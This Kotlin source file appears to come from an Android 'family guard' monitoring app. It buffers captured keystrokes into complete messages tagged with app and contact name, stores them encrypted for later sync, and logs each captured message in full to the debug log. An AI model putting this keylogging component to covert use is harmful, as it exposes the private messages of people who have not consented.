package com.familyguardpro.utils

import android.content.Context
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey
import com.familyguardpro.models.KeystrokeData
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.util.UUID

/**
 * KeystrokeBuffer manages local storage and batching of keystroke data.
 * Uses DEBOUNCING to capture complete messages instead of individual keystrokes.
 * Only saves the final text after typing stops for DEBOUNCE_TIMEOUT_MS.
 */
class KeystrokeBuffer(context: Context) {
    
    companion object {
        private const val TAG = "KeystrokeBuffer"
        private const val PREFS_NAME = "keystroke_buffer_prefs"
        private const val KEY_KEYSTROKES = "buffered_keystrokes"
        private const val KEY_CURRENT_SESSION = "current_session_id"
        private const val KEY_SESSION_START_TIME = "session_start_time"
        private const val KEY_CURRENT_APP = "current_app_package"
        private const val KEY_CURRENT_CONTACT = "current_contact_name"
        private const val KEY_LAST_KEYSTROKE_TIME = "last_keystroke_time"
        
        // Debounce timeout: Wait 2 seconds after typing stops to save message
        private const val DEBOUNCE_TIMEOUT_MS = 2000L
        
        // Session timeout: 5 minutes of inactivity creates new session
        private const val SESSION_TIMEOUT_MS = 5 * 60 * 1000L
        
        // Maximum buffer size before forcing sync
        private const val MAX_BUFFER_SIZE = 100
        
        @Volatile
        private var instance: KeystrokeBuffer? = null
        
        fun getInstance(context: Context): KeystrokeBuffer {
            return instance ?: synchronized(this) {
                instance ?: KeystrokeBuffer(context.applicationContext).also { instance = it }
            }
        }
    }
    
    private val gson = Gson()
    private val prefs: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())
    
    // Current typing session data (in-memory until finalized)
    private var currentTypingText: String = ""
    private var currentTypingApp: String = ""
    private var currentTypingAppName: String = ""
    private var currentTypingContact: String = ""
    private var currentTypingFieldType: String = "text"
    private var currentTypingDeviceId: String = ""
    private var currentTypingSessionId: String = ""
    private var currentTypingStartTime: Long = 0L
    
    // Debounce runnable
    private var debounceRunnable: Runnable? = null
    
    // Callback for when a complete message is ready
    private var onMessageComplete: ((KeystrokeData) -> Unit)? = null
    
    init {
        val masterKey = MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()
            
        prefs = EncryptedSharedPreferences.create(
            context,
            PREFS_NAME,
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )
    }
    
    /**
     * Set callback for when a complete message is ready to sync
     */
    fun setOnMessageCompleteListener(listener: (KeystrokeData) -> Unit) {
        onMessageComplete = listener
    }
    
    /**
     * Add a keystroke - uses debouncing internally.
     * Only saves the final complete message after typing stops.
     */
    fun addKeystroke(
        deviceId: String,
        packageName: String,
        appName: String,
        contactName: String,
        textContent: String,
        fieldType: String
    ) {
        val currentTime = System.currentTimeMillis()
        
        // Check if context changed (different app or contact)
        val contextChanged = packageName != currentTypingApp || contactName != currentTypingContact
        
        // Check if session timed out
        val sessionTimedOut = currentTypingStartTime > 0 && 
            (currentTime - currentTypingStartTime) > SESSION_TIMEOUT_MS
        
        // If context changed or timeout, finalize previous message first
        if ((contextChanged || sessionTimedOut) && currentTypingText.isNotBlank()) {
            // Cancel any pending debounce
            debounceRunnable?.let { handler.removeCallbacks(it) }
            // Finalize the previous message immediately
            finalizeCurrentMessage()
        }
        
        // Start new session if needed
        if (currentTypingSessionId.isEmpty() || contextChanged || sessionTimedOut) {
            currentTypingSessionId = UUID.randomUUID().toString()
            currentTypingStartTime = currentTime
            Log.d(TAG, "📱 New typing session: contact=$contactName, app=$appName")
        }
        
        // Update current typing data
        currentTypingDeviceId = deviceId
        currentTypingApp = packageName
        currentTypingAppName = appName
        currentTypingContact = contactName
        currentTypingFieldType = fieldType
        currentTypingText = textContent
        
        // Cancel previous debounce timer
        debounceRunnable?.let { handler.removeCallbacks(it) }
        
        // Schedule finalization after debounce timeout
        debounceRunnable = Runnable {
            finalizeCurrentMessage()
        }
        handler.postDelayed(debounceRunnable!!, DEBOUNCE_TIMEOUT_MS)
        
        Log.d(TAG, "📝 Typing: '${textContent.take(30)}...' (saves after ${DEBOUNCE_TIMEOUT_MS}ms)")
    }
    
    /**
     * Finalize the current typing session and save the complete message.
     */
    @Synchronized
    private fun finalizeCurrentMessage() {
        // Only save if there's actual text content
        val text = currentTypingText.trim()
        if (text.isEmpty() || text.length < 2) {
            Log.d(TAG, "Skipping empty or too short message")
            resetCurrentTyping()
            return
        }
        
        val keystroke = KeystrokeData(
            deviceId = currentTypingDeviceId,
            sessionId = currentTypingSessionId,
            timestamp = System.currentTimeMillis(),
            packageName = currentTypingApp,
            appName = currentTypingAppName,
            contactName = currentTypingContact,
            textContent = text,
            fieldType = currentTypingFieldType
        )
        
        // Add to buffer
        val keystrokes = getBufferedKeystrokes().toMutableList()
        keystrokes.add(keystroke)
        saveBufferedKeystrokes(keystrokes)
        
        Log.d(TAG, "✅ MESSAGE COMPLETE: contact=${keystroke.contactName}, text='$text'")
        
        // Notify listener that message is ready
        onMessageComplete?.invoke(keystroke)
        
        // Reset current typing
        resetCurrentTyping()
    }
    
    /**
     * Reset current typing session
     */
    private fun resetCurrentTyping() {
        currentTypingText = ""
        currentTypingSessionId = ""
        currentTypingStartTime = 0L
        debounceRunnable = null
    }
    
    /**
     * Force finalize any pending message (call on app switch/screen off)
     */
    fun flushPendingMessage() {
        debounceRunnable?.let { handler.removeCallbacks(it) }
        if (currentTypingText.isNotBlank()) {
            finalizeCurrentMessage()
        }
    }
    
    /**
     * Get all buffered keystrokes (complete messages only).
     */
    fun getBufferedKeystrokes(): List<KeystrokeData> {
        val json = prefs.getString(KEY_KEYSTROKES, "[]") ?: "[]"
        return try {
            val type = object : TypeToken<List<KeystrokeData>>() {}.type
            gson.fromJson(json, type) ?: emptyList()
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing keystrokes: ${e.message}")
            emptyList()
        }
    }
    
    /**
     * Save buffered keystrokes.
     */
    private fun saveBufferedKeystrokes(keystrokes: List<KeystrokeData>) {
        val json = gson.toJson(keystrokes)
        prefs.edit().putString(KEY_KEYSTROKES, json).apply()
    }
    
    /**
     * Get keystrokes and clear buffer for sync.
     */
    fun getAndClearBuffer(): List<KeystrokeData> {
        // First flush any pending message
        flushPendingMessage()
        
        val keystrokes = getBufferedKeystrokes()
        clearBuffer()
        Log.d(TAG, "Buffer cleared after retrieving ${keystrokes.size} messages")
        return keystrokes
    }
    
    /**
     * Clear the keystroke buffer.
     */
    fun clearBuffer() {
        prefs.edit().putString(KEY_KEYSTROKES, "[]").apply()
        Log.d(TAG, "Buffer cleared")
    }
    
    /**
     * Check if buffer needs syncing.
     */
    fun needsSync(): Boolean {
        val keystrokes = getBufferedKeystrokes()
        return keystrokes.isNotEmpty() && keystrokes.size >= MAX_BUFFER_SIZE
    }
    
    /**
     * Get current buffer size.
     */
    fun getBufferSize(): Int {
        return getBufferedKeystrokes().size
    }
    
    /**
     * Reset current session (call when app loses focus).
     */
    fun resetSession() {
        flushPendingMessage()
        prefs.edit().apply {
            remove(KEY_CURRENT_SESSION)
            remove(KEY_CURRENT_APP)
            remove(KEY_CURRENT_CONTACT)
        }.apply()
        Log.d(TAG, "Session reset")
    }
    
    /**
     * Get current session info for debugging.
     */
    fun getCurrentSessionInfo(): Map<String, Any?> {
        return mapOf(
            "currentTypingText" to currentTypingText.take(50),
            "currentTypingApp" to currentTypingApp,
            "currentTypingContact" to currentTypingContact,
            "sessionId" to currentTypingSessionId,
            "bufferSize" to getBufferSize()
        )
    }
}
